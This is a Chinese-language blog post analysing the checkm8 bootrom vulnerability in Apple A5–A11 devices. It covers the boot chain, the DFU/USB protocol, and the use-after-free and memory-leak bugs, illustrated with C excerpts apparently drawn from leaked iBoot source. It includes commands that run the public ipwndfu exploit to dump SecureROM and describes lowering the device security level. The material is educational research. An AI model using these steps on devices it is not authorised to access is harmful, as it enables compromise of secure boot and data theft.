---
layout: post
title:  "深入分析苹果设备 checkm8 漏洞"
date:   2025-05-25 13:27:38 +0800
category: hardware
---
checkm8是影响苹果A5～A11系列芯片的bootrom漏洞，该漏洞位于USB协议栈，包含了一个释放后重引用漏洞和一个内存泄漏bug。攻击者利用checkm8可以实现bootrom级别的任意代码执行，破坏设备的安全启动链，实现苹果设备固件dump和系统越狱。漏洞在生产阶段已经固化在芯片的ROM区域，无法通过软件更新来修补。

checkm8最早由littlelailo在2019年5月31日公布并被命名为“moonshine”，当时漏洞利用已经在A8芯片上完成了适配。时隔3个月2019年9月27日checkra1n团队成员axi0mX在推特公布了该漏洞，正式命名为“checkm8”，同一天公开了漏洞利用工具ipwndfu，实现了A系列芯片大范围适配，以其能够将当时最新苹果设备的核心机密SecureROM成功dump出来而一夜走红，成为当时的热点事件，而checkm8这个叫法也因此被大众所熟知。

checkm8的魅力在于，至今为止它仍然是越狱老旧苹果设备的主要手段，越狱社区也基于该漏洞开发出了成熟稳定的越狱软件chackra1n。


# 事件背景

## 事件发展

- 2018年2月8日iBoot源码泄漏事件：

[**史上最大源码泄露事件：iOS 关键源代码被匿名公布在 GitHub 上**](https://mp.weixin.qq.com/s?__biz=MzkzMDY1NDgyOQ==&mid=2247777999&idx=1&sn=bc4b3713a056320dfc2a63152d8682dd&source=41#wechat_redirect)

[**如何看待 2018 年 2 月 8 日iBoot源代码泄漏事件？**](https://www.zhihu.com/question/266898229)

- 2018年2月9日苹果发布声明[“**该源代码已过时 不必担忧**”](https://tech.sina.com.cn/it/2018-02-09/doc-ifyrkuxs4997460.shtml)

- 2019年9月27日国外安全员[@axi0mX](https://x.com/axi0mX)通过公开了一个iPhone BootROM 的漏洞和[漏洞利用工具](https://github.com/axi0mX/ipwndfu)：

![截屏2025-03-18 08.58.11.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_08.58.11.png)

![截屏2025-03-18 10.10.37.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_10.10.37.png)

[**为什么说这次苹果A系列处理器中的BootROM漏洞是史诗级的？**](https://www.expreview.com/70777.html)

[**iPhone史诗级漏洞checkm8攻击原理浅析**](https://zhuanlan.zhihu.com/p/87456653)

为什么我们把checkm8漏洞用“史诗”来形容，因为该漏洞影响面之广，引发的反响之强烈，对研究苹果安全具有深远的意义。作者认为该漏洞在苹果越狱史上能留下一笔，称之为“EPIC JAILBREAK”。

源码泄漏事件发生后，大部分吃瓜网友从iOS操作系统的角度认为这并不是一件值得大惊小怪的事情，但这也不排除是苹果请来的水军……

![截屏2025-03-18 10.03.51.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_10.03.51.png)

![截屏2025-03-18 10.04.29.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_10.04.29.png)

![截屏2025-03-18 10.04.57.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_10.04.57.png)

苹果当时也希望此事低调处理，把公众的视线引向“过时的iOS源代码”这一话题。

因为大部分人不了解设备底层，所以不知道这份泄漏源码对破解iPhone的重要性。

但最早在Reddit上公布“iBoot 源码已被泄漏”这一消息的用户Apple External表示，“泄漏的代码里面包含了bootrom的源代码，并且这份bootrom源码已经在多个设备上面使用”。

![640.webp](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/640.webp)

这个事情的性质就完全不同了，因为iOS源码可以通过打补丁的方式修补漏洞。但是bootrom级别的漏洞，引导阶段被利用，大概率只能先放着了。

假如苹果为将来的型号囤了大量的芯片，或者当时正在热销的型号用了这些芯片（iPhone X、iPhone 8/8 Plus当时正在热销，iPad 6当年发布，iPad 7于2019年发布，iPod Touch 7于2019年发布），如果这些芯片存在着不可修复的bootrom漏洞，也就意味着现在的漏洞能攻陷将来的设备……，因为苹果不太可能因为这个事情就把真金白银采购的芯片做报废处理吧。

快进到2019年9月27日@axi0mX公开的[checkm8](https://x.com/axi0mX/status/1177542201670168576)漏洞及其漏洞利用工具[ipwndfu](https://github.com/axi0mX/ipwndfu)

1年前泄漏的iBoot源代码和checkm8漏洞的发现到底有没有关系？

axi0mX声称他是通过补丁对比发现了这一漏洞。2018年夏，苹果在iOS12中修补了iBoot USB代码中的一个UAF漏洞。根据泄漏的iBoot看，iBoot和SecureROM共享了部分代码，所以axi0mX猜测在SecureROM中也存在该漏洞也是合理的。他并没有明说参考了泄漏的源码。

![截屏2025-03-18 13.55.37.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_13.55.37.png)

![截屏2025-03-18 13.54.57.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_13.54.57.png)

事后axi0mX用戏谑的语气说到“量子物理学的叠加理论表明，在有人审计SecureROM之前，可利用的漏洞既存在又不存在，这是一种状态的叠加”。

我们纵观整个iPhone越狱史，前人已经做了大量的工作，SecureROM的堆管理器和地址空间布局已经摸的大差不差了，再加上泄漏源码的助攻、官方补丁的提示，这说明最早在2018年年底，各种必要的条件已经具备，checkm8确实已经呼之欲出。

所以外界猜测，2018年泄漏的iBoot源码在checkm8的挖掘与利用上起到了一定程度的作用。

![截屏2025-03-18 14.07.21.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_14.07.21.png)

![截屏2025-03-18 13.52.58.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-18_13.52.58.png)

据我们团队分析，ipwndfu工具在芯片型号适配、芯片命名、关键数据结构、ROP片段的选取等细节方面与泄漏的源码有较高的匹配程度。

## 影响范围

| **SoC型号** | **内部代号** | **受影响的设备** | **图片** |
| --- | --- | --- | --- |
| A5 | S5L8940XSI | iPhone 4S， iPad 2 |  |
| A5 | S5L8942XSI | iPod touch 4，iPad 2/mini 1G，Apple TV 3 |  |
| A5 | S5L8947XSI | Apple TV 2/3 |  |
| A5X | S5L8945XSI | iPad 3 |  |
| A6 | S5L8950XSI | iPhone 5/5C |  |
| A6X | S5L8955XSI | iPad4 |  |
| A7 | S5L8960XSI | iPhone 5S，iPad Air 1，iPad mini 2/3 |  |
| S1 | S7002SI | Apple Watch 1代 |  |
| A8 | T7000SI | iPhone 6/6 plus， iPad mini 4， Apple TV 4，iPod touch 6 |  |
| A8X | T7001SI | iPad Air 2 |  |
| A9 | S8000SI | iPhone 6S/6S plus，iPhone SE一代，iPad5 |  |
| A9X | S8001SI | iPad Pro 1代 |  |
| A10 | T8010SI | iPhone 7/7 plus，iPad 6/7，iPod touch 7 |  |
| A10X | T8011SI | iPad Pro（2017），Apple TV 4K |  |
| A11 | T8015SI | iPhone 8/ 8 plus/X |  |
|  | T8002SI | Apple Watch Series 1/2 |  |
| S3 | T8004SI | Apple Watch Series 3 |  |
- iPhone设备

iPhone 4S，iPhone 5 / 5C / 5S，iPhone 6 / 6 Plus / 6S / 6S plus，iPhone SE 一代，iPhone 7 / 7 Plus，iPhone 8 / 8 Plus，iPhone X

- iPad设备

iPad Air 1，iPad mini 1G，iPad 2 / mini 2，iPad 3 / mini3，iPad 4 / mini4，iPad 5，iPad 6，iPad 7，iPad Pro 1代

- iPod设备

iPod touch 4，iPod touch 6，iPod touch 7

- Apple TV设备

Apple TV 2，Apple TV 3，Apple TV 4，Apple TV 4K

- Apple Watch设备

Apple Watch 1代，Apple Watch Series 1 / 2 / 3

- 不受影响的设备

使用A12及以上芯片的设备不受影响，例如iPhone XS / XR

# 研究对象

研究对象是淘宝二手iPhone7手机。

![WechatIMG921.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/WechatIMG921.jpg)

iPhone7手机使用的SoC处理器是苹果A10芯片，该芯片苹果内部代号为T8010SI。

A10芯片使用的是**ARMv8-A** 架构，支持 AArch64和 AArch32两种执行状态。

![截屏2025-03-09 13.54.29.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-09_13.54.29.png)

# iOS安全启动机制

参考链接：

[https://zhuanlan.zhihu.com/p/87456653](https://zhuanlan.zhihu.com/p/87456653)

[https://newosxbook.com/bonus/iBoot.pdf](https://newosxbook.com/bonus/iBoot.pdf)

iOS老旧设备的启动过程分为4个阶段：BootROM —> LLB —> iBoot —> Kernelcache。

从A10处理器开始，LLB阶段被合并到iBoot，由BootROM直接启动iBoot，启动过程变为3个阶段：

BootROM  —> iBoot —> Kernelcache。

以下是苹果对iBoot的定义：

```python
iBoot

Code that loads XNU, as part of the secure boot chain. Depending on the 
system on chip (SoC) generation, iBoot may be loaded by the Low-Level Bootloader 
or directly by the Boot ROM.
```

- BootROM

固化在CPU内部的一段代码，CPU上电后执行的第一行代码，作用是初始化系统环境，对iBoot进行加载和验签，若验证通过则跳转到iBoot；

- iBoot

第二阶段引导程序，作用是进一步初始化环境，对内核进行加载和验签，若内核验证通过则跳转到内核；

- Kernelcache

iOS系统内核，对OS进行加载和验签；

- OS

iOS用户界面、后台服务等非核心组件。OS和Kernelcache的关系类比Android和Linux内核的关系。

- APP

苹果设备运行的用户APP也需要经过验签才能运行。

![checkm8-启动阶段.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E5%90%AF%E5%8A%A8%E9%98%B6%E6%AE%B5.jpg)

可以看到，苹果设备的启动被划分为多个阶段，前一个阶段要验证后一个阶段的代码是否经过苹果签名，验证通过才会加载并运行后一个阶段，由此形成一条信任链，确保最终用户操作的数据和代码是安全的没有被恶意修改过的。

## SecureROM简介

SecureROM是苹果对BootROM的内部称呼，它俩是一个东西。

SecureROM是泄漏的iBoot工程文件的一部分，位于apps/SecureROM目录下。

SecureROM 作为系统启动时执行的第一段程序，扮演着整个安全启动链技术的信任基石。

iOS的根证书被烧录在芯片的ROM中。系统的启动从根证书开始一级一级校验，确保加载的下一级内容是经过苹果签名的，任何一级校验失败都会导致设备无法启动，文件系统无法解密。

根证书被添加在SecureROM的末尾，在芯片制造过程中随着SecureROM一起烧录进去。

![截屏2025-03-14 16.09.43.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-14_16.09.43.png)

SecureROM的安全体现在：

- 封杀写权限

芯片制造出来之后就无法被修改，即使是苹果公司也无法在成品芯片上面修改。

- 封杀读权限

从BootROM跳转到iBoot的过程中，要经过一段trampoline代码，这段代码通过置位系统安全寄存器，关闭了ROM的读取权限。也就是说过了SecureROM阶段，即使在iBoot阶段攻破系统，也读不到SecureROM和根证书的内容。

![截屏2025-03-14 15.58.40.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-14_15.58.40.png)

一位知乎博主评价说：“苹果的想法很单纯——如果一段程序黑客读都读不到，改也改不了，那么这段程序应该就会很安全。我们连程序内容都看不到，怎么分析程序漏洞？”

# DFU模式/协议

## DFU模式和DFU协议介绍

Device Firmware Update（DFU）“设备固件升级”的简称，是作为启动失败的保护。

DFU模式是苹果手机救砖的最后手段，当设备因系统崩溃、越狱失败、OTA 升级失败或其他严重问题而无法正常启动时，DFU模式可以帮助恢复设备。

SecureROM实现了DFU模式，在DFU模式下可以对设备固件进行升级或者降级，在DFU过程中用户数据可能会被擦除。

有2种方式可以进入DFU模式：1. iBoot验证不通过无法加载 2. 通过GPIO引脚设置，按键进入DFU模式就是GPIO引脚设置的方法。

USB协议栈对DFU协议做了描述：[https://usb.org/sites/default/files/DFU_1.1.pdf](https://usb.org/sites/default/files/DFU_1.1.pdf)

USB DFU协议是基于USB[控制传输](https://www.usbzh.com/article/detail-55.html)模式的，定义了固件升级中主机和设备的通信过程。

![checkm8-DFU协议.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-DFU%E5%8D%8F%E8%AE%AE.jpg)

## USB通信过程

USB也许是我们最熟悉，但又是最陌生的数据通信协议。最熟悉是因为USB设备随处可见，我们不经意中就会用到USB。最陌生是因为随着硬件的发展，USB协议的内涵已经远超最初的框架，兼容了大量的设备，成为了宇宙通用协议。

主机和设备端点之间有4种通信模式，分别为[中断传输](https://www.usbzh.com/article/detail-109.html)模式，[控制传输](https://www.usbzh.com/article/detail-55.html)模式、[批量传输](https://www.usbzh.com/article/detail-40.html)模式和[同步传输](https://www.usbzh.com/article/detail-118.html)模式。

USB DFU模式使用的是控制传输模式。该模式下一次传输称为Transaction，一个Transaction包含3个阶段：

- Setup阶段
    - 主机向设备发送setup token
    - 主机向设备发送setup数据，由协议栈实现
        - bmRequestType，定义请求的方向、请求类型和接收者
        - bRequest， 定义的请求的具体事项
        - wValue、wIndex，根据bRequest的不同而具体定义
        - wLength，Data阶段发送/接收的数据长度
    - 设备向主机应答ACK
- Data阶段，数据通信方向由Setup阶段的bmRequestType决定，主机从设备获取数据就是IN，设备从主机接收数据或者执行命令就是OUT。数据分段为最小数据传输单元进行传输，在iPhone DFU模式中最小传输单元是0x40字节。
    - 主机到设备传输OUT
        - 主机向设备发送OUT token，表示主机已经做好发送数据的准备
        - 主机向设备发送一个最小数据传输单元
        - 设备向主机应答ACK表示接收成功
    - 设备向主机传输IN
        - 主机向设备发送IN token，表示主机已经做好接收数据的准备
        - 设备向主机发送一个最小数据传输单元
        - 主机向设备应答ACK表示接收成功
- Status阶段，所有数据传输完毕
    - 对于OUT传输，主机向设备发送IN token，设备向主机返回一个空数据包表示成功
    - 对于IN传输，主机向设备发送OUT token，随后再向设备发送一个空数据包表示成功
        
![截屏2025-03-12 10.42.52.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_10.42.52.png)
        

以上3个阶段组成一个Transaction。

从抓包数据来看，不一定每个IN或者OUT token都能被正确应答。一次最小数据单元的传输，只有被正确应答才能进行下一个传输。

![截屏2025-03-12 10.59.25.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_10.59.25.png)

![截屏2025-03-12 10.38.22.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_10.38.22.png)

# iPhone7进入DFU模式的方法

## 关机状态下进入DFU

1. 打开爱思助手，并将 iPhone 连接在电脑上；
2. 长按电源键关闭 iPhone；
3. 长按**电源键** 3 秒，之后同时按下**电源键**和**「音量 -」键** 10 秒；
4. 松开电源键，继续按住**「音量 -」键** 5 秒；
5. 如果此时屏幕处于黑屏状态，同时 iTunes 提示检测到一台处于恢复模式的 iPhone，则表示进入 DFU 模式。

## 开机状态下进入DFU

1. 按下**「音量 -」；**
2. 按下电源键；
3. 屏幕会先点亮，然后黑屏，黑屏4秒钟之后松开电源键；
4. 10秒钟后再松开**「音量 -」。**

# ipwndfu工具初探

[ipwndfu](https://github.com/axi0mX/ipwndfu)工具是一个旧款iPhone手机的越狱合集，可以利用这次的checkm8漏洞实现对iPhone7手机的SecureROM固件提取。

该工具运行在Python2.7.18环境下，需要进行miniconda虚拟环境配置：

```bash
# 下载安装python2.7.18环境
$ conda create -n checkm8 python=2.7
# 激活环境
$ conda activate checkm8
# 执行exp
$ sudo python2 ./ipwndfu -p
# 把SecurityROM dump到本级目录
$ sudo python2 ./ipwndfu --dump-rom
# 退出环境
$ conda deactivate checkm8
```

![截屏2025-02-20 14.29.57.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-02-20_14.29.57.png)

SecureROM-t8010si-2696.0.0.1.33-ROMRELEASE.dump就是通过漏洞dump出来的SoC里面的SecurityROM。

可以与[https://securerom.fun/](https://securerom.fun/)这里下载的固件进行比对，经测试，固件是一致的。

![截屏2025-02-20 14.55.35.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-02-20_14.55.35.png)

# 苹果设备启动过程

## SecureROM做的事情

- 平台启动：设置特定于平台的寄存器；
- 重定位循环：
- CPU初始化：初始化MMU、设置系统寄存器SCTLR；
- 初始化时钟、SRAM总线、GPIO引脚；
- 在A12平台上，会设置ARMv8.3的PAC随机种子；
- 系统初始化：初始化堆和进程子系统；
- 平台早期初始化：苹果设备特定初始化例程，包括电源管理、主板和芯片初始化、串口初始化；
- 检查DFU引脚，确定是否强制进入DFU模式；
- 平台后期初始化：其他的苹果设备特定初始化例程，主板其他组件的初始化；
- 获取引导设备和所选的引导配置。这通常会加载下一阶段（由illb标签标记）。但如果该阶段无法加载（或者前面被强制DFU了），那么就会下降到DFU模式；

## 苹果设备的DFU模式

![截屏2025-02-20 17.05.17.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-02-20_17.05.17.png)

然后SecureROM等待DFU下载请求。通常情况可以向设备传送一个(recovery mode LLB/iBoot)iBSS镜像，如果验证通过，镜像将被启动。

## 设备安全性降级

设备出厂时会对CPFM写入值用于确定保护等级，CPFM一旦写入就不可更改。

零售产品CPFM=3，表示“安全、产品”

工程机的CPFM通常是1（安全、开发）或者0（不安全、开发）。

但是SecureROM会把CPFM读进内存，然后设置安全等级。

尽管CPFM是不可修改的，但是CPFM被SecureROM加载到寄存器中，该寄存器又被映射到内存地址，并且是可写的。

因此我们只要把寄存器的值修改掉，就可以降低设备的安全等级，打开JTAG调试器。

需要注意的是，设备降级在下一次重启之后就会失效，并不是永久的。

# 漏洞分析

checkm8是位于SecureROM中USB DFU协议栈的两个漏洞：

- 主攻——UAF（直到A14芯片才修复）
- 辅助——内存泄漏（A12芯片中修复）

## USB子系统初始化

USB数据的处理由两部分组成，第一部分是USB中断处理例程，第二部分是USB任务。

从系统初始化角度来看，USB子系统的初始化最终完成2件事情，一是创建synopsys_otg_task任务响应setup数据包，二是注册synopsys_otg_int_handler中断处理例程。

每当发生USB中断，中断处理函数就把数据从DMA内存区域拷贝到EP0端点的USB任务队列，再通知synopsys_otg_task响应数据包。

usb_init函数完成USB子系统的初始化，调用路径为：
*main → boot_selected → getDFUImage → usb_init*

usb_init函数完成了4件事：

1. 创建synopsys_otg_task任务

配合USB中断处理函数，相当于中断的下半部。

1. 在堆上面分配0x800大小的io_buffer

暂存接收到的启动镜像。

1. 注册DFU处理函数handler_interface_request

实现了DFU协议栈。

1. 注册USB中断处理函数synopsys_otg_int_handler
    1. 处理SETUP token 或者 OUT token
    
    从DMA拷贝数据到全局数组ep0_rx_buffer[0x40]，通知synopsys_otg_task任务解析。从接收缓冲区的大小可知，DFU数据包分段长度为0x40字节；
    
     b.  处理IN token
    
    继续DEVICE to HOST传输任务，设备向主机发送的数据包分段长度为0x40。
    

## DFU生命周期

iPhone设备进入DFU模式后，_main函数进入while(1)循环，循环主体是boot_selected函数。

boot_selected函数调用getDFUImage函数试图从主机端接收启动镜像。

getDFUImage函数做了2件事情：

1. 调用usb_init初始化USB子系统
2. 睡眠等待dfu_event事件
    1. 在此期间中断处理函数synopsys_otg_int_handler和synopsys_otg_task任务接收DFU镜像
    2. 若DFU镜像接收完毕，或主机发送RESET命令，则dfu_done被置1，进入USB资源释放流程
    

返回boot_selected对接收到的DFU镜像验签，若验证失败则重入getDFUImage，重新初始化USB子系统，重新接收DFU镜像。

![checkm8-DFU生命周期.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-DFU%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.jpg)

## DFU镜像接收过程

synopsys_otg_task一直在usb_task_event事件上等待，直到被中断处理例程synopsys_otg_int_handler唤醒，进入handle_interrupt处理USB报文。

![截屏2025-03-12 19.53.51.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-12_19.53.51.png)

handle_ep0_data_phase函数接收DFU镜像，调用路径为：

synopsys_otg_task → handle_interrupt → synopsys_otg_handle_ep0_out → usb_core_handle_usb_control_receive → handle_ep0_data_phase

DFU镜像接收过程为：

1. 镜像包在主机端被分段为0x800大小发送；
2. USB协议栈将0x800的数据分段为0x40大小传输；
3. 设备把接收到0x40个字节保存在io_buffer；
4. 若io_buffer的0x800空间被填满，把io_buffer内容拷贝到INSECURE_MEMORY区域；
5. 重复步骤1～4，直到DFU镜像接收完毕。

![checkm8-镜像接收过程.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E9%95%9C%E5%83%8F%E6%8E%A5%E6%94%B6%E8%BF%87%E7%A8%8B.jpg)

全局变量ep0_data_phase_buffer指示写入的位置，最初指向io_buffer缓冲区。DFU镜像片段被拷贝到io_buffer，更新ep0_data_phase_buffer指向下一个写入位置。

每收到一个DFU镜像片段就更新ep0_data_phase_rcvd，记录已接收的长度。

全局变量ep0_data_phase_length保存了本轮DFU镜像长度，若接收的数据达到预期长度，或最后一次接收的长度小于0x40，说明接收完毕，data_received把DFU镜像片段从io_buffer拷贝到0x1800B0000，该区域也叫INSECURE_MEMORY区域。

再调用usb_core_send_zlp向主机发送一个0长度数据包，表示可以传输下一个0x800片段。

最后清理全局变量，准备接收下一个0x800片段。

```c
static void handle_ep0_data_phase(u_int8_t *rx_buffer, u_int32_t data_rcvd, bool *data_phase)
{
  remaining = ep0_data_phase_length - ep0_data_phase_rcvd;
  to_copy = (data_rcvd > remaining) ? remaining : data_rcvd;
    
  memcpy(ep0_data_phase_buffer, rx_buffer, to_copy);
    
	ep0_data_phase_buffer += to_copy;
	ep0_data_phase_rcvd += to_copy;

	if((ep0_data_phase_rcvd == ep0_data_phase_length) || (data_rcvd != EP0_MAX_PACKET_SIZE))
	{
		data_received(ep0_data_phase_rcvd);
		usb_core_send_zlp(); //we should check returnval of call and possibly stall
		goto done;
	}
	
	return;
	
done:
    ep0_data_phase_rcvd = 0;
    ep0_data_phase_length = 0;
    ep0_data_phase_buffer = NULL;
    ep0_data_phase_if_num = NO_DATA_PHASE_HANDLER;
}
```

全局变量ep0_data_phase_buffer和ep0_data_phase_length由函数handle_interface_request赋值，该函数实现了USB DFU协议栈，具体过程如下：

1. 在正式传输DFU镜像之前，主机需要发送bmRequest=0x21，bRequest=DFU_DNLOAD的SETUP package；

![截屏2025-03-23 16.27.37.png](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-23_16.27.37.png)

1. 全局变量ep0_data_phase_buffer作为引用传递给handle_interface_request函数作为参数；

```c
void usb_core_handle_usb_control_receive (u_int8_t *ep0_rx_buffer, 
												bool is_setup, int receive_length, bool *data_phase)
{
	memcpy(&setup_request, ep0_rx_buffer, sizeof(setup_request));	
	
	switch(setup_request.bmRequestType & USB_REQ_TYPE_MASK) {	//处理setup报文
		case USB_REQ_TYPE_CLASS :
			int ret = handle_interface_request(&setup_request, &ep0_data_phase_buffer);
			ep0_data_phase_length = ret;
			goto success;
                                                                             
```

1. handle_interface_request函数中把io_buffer指针保存在全局变量ep0_data_phase_buffer中，把wLength字段作为返回值赋值给全局变量ep0_data_phase_length。

```c
static int handle_interface_request(struct usb_device_request *request,
																		 uint8_t **out_buffer)
{
	u_int8_t bRequest = request->bRequest;
	u_int16_t wLength = request->wLength;
	int ret = -1;
    
	if((request->bmRequestType & USB_REQ_DIRECTION_MASK) == USB_REQ_HOST2DEVICE)
	{    
		switch(bRequest)
		{
			case DFU_DNLOAD:
			{
				if(wLength == 0) {
					.....
				}
				else {
					if(wLength > sizeof(*io_buffer)) { //wLength <= 0x800
						return -1;
					}		
					*out_buffer = (uint8_t *)io_buffer;
				}
				expecting = wLength;
				ret = wLength;
				break;
			}
```

io_buffer填满后调用data_received把数据拷贝到全局变量image_buffer指向的INSECURE_MEMORY区域。

其中全局变量image_buffer_size记录了DFU镜像的长度，该值只是定义DFU镜像的最大长度不得超过INSECURE_MEMORY区域的大小，并不是DFU镜像的真实长度。

全局变量total_received记录了INSECURE_MEMORY区域的写入位置。

```c
static void data_received(u_int32_t received)
{

	if((total_received + received) > image_buffer_size) {
		set_status(errADDRESS, STANDARD_DELAY_MS, dfuERROR, 0);
  }
	else {
		memcpy(&image_buffer[total_received], (void *)io_buffer, received);
		total_received += received;
		set_status(errOK, STANDARD_DELAY_MS, dfuDNLOAD_IDLE, 0);
	}
}
```

## USB资源析构

若DFU镜像接收完毕或者USB被reset，getDFUImage调用usb_quiesce函数释放USB资源。

usb_init中分配的0x800大小用于接收DFU镜像的io_buffer也在这里被释放。

![checkm8-USB资源析构.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-USB%E8%B5%84%E6%BA%90%E6%9E%90%E6%9E%84.jpg)

## UAF 漏洞函数

若设备在接收DFU镜像过程中主机取消了传输，将导致done标签之后的全局变量继续保留。

ep0_data_phase_buffer指针是当前在io_buffer的写入位置，

ep0_data_phase_rcvd是接收到的字节数，

ep0_data_phase_length是本轮DFU分段长度，由setup报文的wLength字段确定，不超过0x800。

```c
static void handle_ep0_data_phase (u_int8_t *rx_buffer, u_int32_t data_rcvd, 
																				bool *data_phase)
{
	......
    
	if((ep0_data_phase_rcvd == ep0_data_phase_length) || (data_rcvd != EP0_MAX_PACKET_SIZE))
	{    
	  data_received(ep0_data_phase_rcvd);
		usb_core_send_zlp(); //we should check returnval of call and possibly stall
  }  
		goto done;   
	}
	
	return;
	
done:
    ep0_data_phase_rcvd = 0;
    ep0_data_phase_length = 0;
    ep0_data_phase_buffer = NULL;
    ep0_data_phase_if_num = NO_DATA_PHASE_HANDLER;
    *data_phase = false;
}
```

若主机再向设备发送bmRequestType=0x21，bRequest=DFU_CLR_STATUS的setup报文，则dfu_done被置位，产生一个dfu_event事件。

```c
static int handle_interface_request(struct usb_device_request *request, 
																		uint8_t **out_buffer){
	if((request->bmRequestType & USB_REQ_DIRECTION_MASK) == USB_REQ_HOST2DEVICE){
		switch(bRequest){
			case DFU_CLR_STATUS :
			case DFU_ABORT:
			{
				......
				if(!dfu_done) {
					completion_status = -1;
					dfu_done = true;             //dfu_done置位
					event_signal(&dfu_event);    //产生dfu_event事件
				}
				ret = 0;
				break;
			}
		......
}
```

在dfu_event事件上睡眠等待的getDFUImage被唤醒，调用usb_quiesce释放USB资源。

```c

int getDFUImage(void* buffer, int maxlen)
{
	......
	
	while(!dfu_done) 
		event_wait(&dfu_event);
    
	usb_quiesce();      //释放USB资源，包括io_buffer
    
	......
}
```

boot_selected函数中镜像校验失败，重入getDFUImage函数，重新分配USB资源，重新接收DFU镜像。

但是指示写入位置的ep0_data_phase_buffer还是沿用的上一轮getDFUImage留下的。

若本轮io_buffer分配的位置和前一轮一样，那么这并不会造成什么破坏。

![checkm8-没有驻留情况下的重新分配.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E6%B2%A1%E6%9C%89%E9%A9%BB%E7%95%99%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E9%87%8D%E6%96%B0%E5%88%86%E9%85%8D.jpg)

## 内存泄漏BUG

若getDFUImage释放USB资源时，发生了内存泄漏，部分对象得不到释放，第二轮getDFUImage将会得到不同的堆布局，此时通过ep0_data_phase_buffer指针写入数据就会导致堆溢出。

![checkm8-驻留下的重新分配.jpg](/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E9%A9%BB%E7%95%99%E4%B8%8B%E7%9A%84%E9%87%8D%E6%96%B0%E5%88%86%E9%85%8D.jpg)

内存泄漏的对象是usb_device_io_request。

该对象的作用是，若数据传输方向是设备到主机，那么会申请一个usb_device_io_request对象，挂载到ep->io_head链表上，ep是USB传输端点，是USB设备的最小功能单元，链表出入顺序是FIFO。

其中io_buffer指针指向数据传输缓冲区，例如USB设备描述符，

io_length表示传输的数据量，

callback是回调函数，在usb_device_io_request销毁之前调用，指向standard_device_request_cb函数，

next是链表指针，指向下一个usb_device_io_request对象，通过next指针形成单向链表。

```c
struct usb_device_io_request{
		u_int32_t                       endpoint;
		volatile u_int8_t               *io_buffer;
		int                             status;
		u_int32_t                       io_length;
		u_int32_t                       return_count;
		void (*callback) (struct usb_device_io_request *io_request);
		struct usb_device_io_request    *next;
};
```

当设备接收到bmRequest=0x21，bRequest=0x4（DFU_CLR_STATUS）的SETUP package，那么会触发usb_quiesce释放USB资源，该过程会释放ep→io_buffer队列，每个对象依次调用callback回调函数。在此过程中会发生usb_device_io_request对象的内存泄漏。

释放释放ep→io_buffer队列的路径为：

usb_quiesce → usb_core_stop → usb_controller_stop → synopsys_otg_stop → usb_core_deactivate_endpoint → usb_controller_abort_endpoint → synopsys_otg_abort_endpoint

```c
static void synopsys_otg_abort_endpoint(u_int32_t endpoint){
	......
	aborted_list = ep->io_head;         //摘下端点的IO队列
	ep->io_head = ep->io_tail = NULL;
	......
	while(aborted_list) {
		struct usb_device_io_request *aborted_req = aborted_list;
		aborted_list = aborted_req->next;
		aborted_req->status = USB_IO_ABORTED;
		usb_core_complete_endpoint_io(aborted_req);
	}
}
```

io_length取主机请求的数据长度和设备实际需要传输的数据长度两者之间的较小值。例如主机请求192字节的设备描述符，而设备描述符实际长度为198字节，那么io_length=192。

若当前usb_device_io_request对象传输的数据长度io_length是0x40的倍数，且SETUP package请求的数据量大于io_length，那么设备向主机发送一个零长度数据包（zero length package）表示数据传输完毕。

